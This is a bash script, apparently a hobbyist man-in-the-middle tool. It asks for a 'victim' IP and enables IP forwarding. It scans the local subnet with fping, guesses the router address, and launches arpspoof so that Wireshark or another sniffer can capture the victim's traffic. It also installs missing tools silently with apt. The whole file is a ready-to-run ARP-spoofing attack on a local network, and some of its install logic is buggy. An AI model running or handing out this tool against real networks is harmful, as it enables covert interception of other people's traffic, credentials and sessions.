#!/bin/bash

#colors variables start 
blue="\e[34m"
red="\e[0;91m"
pur="\e[35m"
blink="\e[5m"
bold="\e[1m"
reset="\e[0m"
#colors variables end

clear

#start functions 
banner(){
echo -e   """
${bold}
888b     d888      8888888      88888888888      888b     d888 
8888b   d8888        888            888          8888b   d8888 
88888b.d88888        888            888          88888b.d88888 
888Y88888P888        888            888          888Y88888P888 
888 Y888P 888        888            888          888 Y888P 888 
888  Y8P  888        888            888          888  Y8P  888 
888   ^   888        888            888          888   ^   888 
888       888      8888888          888          888       888 
${reset}

${bold}c${reset} o${bold} d${reset} e${bold} d${reset} by${red}${bold} A Z O${reset} | instagram : ${red}${bold}r7jhz1${reset} | github : ${red}${bold}Az0122${reset}"""
echo " " 
}

catch_ctrl-c(){
clear

echo -e "\nbye..."

echo '0' > /proc/sys/net/ipv4/ip_forward

exit 0 

}

get_ip_victim(){

echo '1' > /proc/sys/net/ipv4/ip_forward

echo ''

read -p "$(echo -e "Enter ${red}${bold}IP${reset} victim : ")" ip_victim
if [[ $ip_victim == [A-Z]* || $ip_victim == "" || $ip_victim == [a-z]* || ${#ip_victim} -le 7 ]]
then
	clear
  banner
  echo ' '
	echo -e "${red}you have to tybe victim ${bold}IP${reset} ! ${reset}"
	sleep 0.5s
	get_ip_victim
fi
}

false_choose() {
read -p """$(
echo -e """
{${bold}${blue}1${reset}} >${bold}${blue} wireshark
${reset}
{${red}${bold}2${reset}} > ${red}${bold}else
${reset}

choose Your ${bold}${pur}Sniffing${reset} Tool ! : """)""" sniffer

if [[ $sniffer == 1 ]];
then 
echo -e "\n${blue}Ctrl-C${reset} For Cancel\n"

sudo wireshark -i $interface | xterm -e sudo arpspoof -i $interface -t $ip_victim $router_ip -r 

elif [[ $sniffer == 2 ]];then

echo -e "\nRun your ${red}${bold}own${reset} sniffer (: " 

echo -e "\n${blue}Ctrl-C${reset} For Cancel"

xterm -e sudo arpspoof -i $interface -t $ip_victim $router_ip -r 
else 
clear
banner
   echo ' '

echo -e "Enter ${red}${bold}IP${reset} victim : ${ip_victim}"
echo -e "${red}${bold}\nwrong input ${blink}! ${reset}"
false_choose
fi
}
#end functions

banner

# root check start
roo=$(id -u )
if [ $roo != 0 ];then
echo -e "${red}run it as ${bold}${blink}root${reset} !${red}"
sleep 0.4
exit
fi
# root check end


#check files start 

which wireshark &> /dev/null
if [[ $? != 0 ]] ; then 
echo -e "${red}you don't have important files  ! ${reset}"
sudo apt install wireshark -y &>/dev/null
    if [[ $? != 0  ]] ; then
    sudo apt update -y &>/dev/null
    sudo apt install wireshark -y &>/dev/null
    fi
clear
banner
fi


which xterm &> /dev/null
if [[ $? != 0  ]]; then
  echo -e "${red}you don't have important files  ! ${reset}"
sudo apt install xterm -y &>/dev/null
    if [[ $? != 0 ]] ; then 
    sudo apt update -y  &>/dev/null
    sudo apt install xterm -y &>/dev/null
    fi
clear 
banner
fi


which fping &> /dev/null
if [[   $? != 0   ]]; then
echo -e "${red}you don't have important files  ! ${reset}"
sudo apt install fping -y &>/dev/null
    if [[ $? != 0 ]] ; then 
    sudo apt update -y  &>/dev/null
    sudo apt install fping -y  &>/dev/null
    fi
clear
banner
fi



if [[ $? != 0 ]]; then
sudo apt install arpspoof -y &>/dev/null
    echo -e "${red}you don't have important files  ! ${reset}"
    if [[ $? != 0 ]] ; then   
    sudo apt update -y  &>/dev/null
    sudo apt install dsniff -y  &>/dev/null
    fi
clear
banner
fi
#check files end 

num_interfaces=$(ifconfig | grep -iw "running" | awk '{print $1}' | grep ':' | grep -v lo | tr -d ':' | wc -l) 
if [[ $num_interfaces > 1 ]] ; then


for ((i=1 ; i <= $num_interfaces ; i++  )); do 

 

all_interfaces=$(ifconfig | grep -iw "running" | awk '{print $1}' | grep ':' | tr -d ':' |   tr "\n" " " | cut -d " " -f$i)


echo -e """[$i] > $all_interfaces
"""

done

read -p "choose your interface : " inter 

choosen_interface=$(ifconfig | grep -iw "running" | awk '{print $1}' | grep ':' | tr -d ':' |  tr "\n" " " | cut -d " " -f$inter)

fi



interface=$(ifconfig $choosen_interface | grep -iw "running" | awk '{print $1}' | grep ':' | tr -d ':' | grep -v lo)



IP=$(ifconfig $interface | grep -w "inet"  | grep -v '127.0.0.1' | awk '{ print $2}' | sed 's/\([0-9]*\.[0-9]*\.[0-9]*\.\)[0-9]*/\10/')



router_ip=$(timeout 0.30 fping -a -g 192.168.100.0/24 2>/dev/null | head -1)
sudo fping -a -g ${IP}/24 2>/dev/null | sort

get_ip_victim

trap "catch_ctrl-c" 2


false_choose

exit
